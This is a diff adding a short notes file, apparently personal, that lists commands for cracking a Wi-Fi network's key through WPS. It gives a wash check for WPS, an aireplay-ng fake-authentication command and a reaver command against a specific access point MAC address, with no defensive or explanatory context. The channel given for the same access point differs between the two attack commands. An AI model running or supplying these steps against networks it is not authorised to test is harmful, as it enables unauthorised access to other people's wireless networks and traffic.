@@ -1,0 +1,11 @@
+This all be done in moniter mode:
+
+To check if the wps is enabled or not:
+> wash --interface wlx1cbfce04e4dd
+
+fake auth to get traffic from access point:
+> aireplay-ng --fakeauth 30 -a DC:1A:C5:7C:CB:71 -h 1C:BF:CE:04:E4:DD wlx1cbfce04e4dd --channel 11
+
+Finnally to get the key put the following command:
+> reaver --bssid DC:1A:C5:7C:CB:71 --channel 1 --interface wlx1cbfce04e4dd -vvv --no-associate
+
